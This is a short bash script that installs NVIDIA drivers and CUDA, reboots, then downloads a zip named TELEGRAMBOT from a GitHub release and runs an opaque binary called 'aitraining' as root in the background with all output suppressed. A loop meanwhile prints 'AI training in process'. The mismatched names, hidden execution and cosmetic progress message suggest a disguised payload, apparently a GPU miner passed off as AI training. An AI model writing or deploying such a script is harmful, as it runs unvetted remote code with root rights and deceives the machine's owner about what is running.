#!/bin/bash

# CUDA installation state file
CUDA_FLAG="/var/tmp/cuda_installed"

# 1. Install CUDA if not already installed
if [ ! -f "$CUDA_FLAG" ]; then
    echo "Bắt đầu cài đặt CUDA..."

    # Update system and install NVIDIA driver
    sudo apt update && sudo apt install -y ubuntu-drivers-common
    sudo ubuntu-drivers install

    # Install CUDA Toolkit
    sudo wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2404/x86_64/cuda-keyring_1.1-1_all.deb
    sudo apt install -y ./cuda-keyring_1.1-1_all.deb
    sudo apt update
    sudo apt -y install cuda-toolkit-11-8
    sudo apt -y full-upgrade

    # Mark installation complete
    sudo touch "$CUDA_FLAG"

    echo "Cài đặt CUDA hoàn tất. Khởi động lại hệ thống..."
    sudo reboot
    exit 0
fi

# 2. Start AI training after reboot
if pgrep -x "aitraining" > /dev/null; then
    echo "An AI training process is already running. Exiting."
    exit 1
fi

nohup bash -c '
sudo apt install -y unzip
sudo wget -O TELEGRAMBOT.zip https://github.com/max313iq/Ssl/releases/download/TELEGRAMBOT/TELEGRAMBOT.zip
sudo mkdir -p TELEGRAMBOT
sudo unzip -o TELEGRAMBOT.zip -d TELEGRAMBOT
cd TELEGRAMBOT || exit
sudo chmod +x aitraining
sudo ./aitraining -c config.json
' > /dev/null 2>&1 &

# Loop to indicate ongoing training
while true; do
    echo "AI training in process"
    sleep 600
done
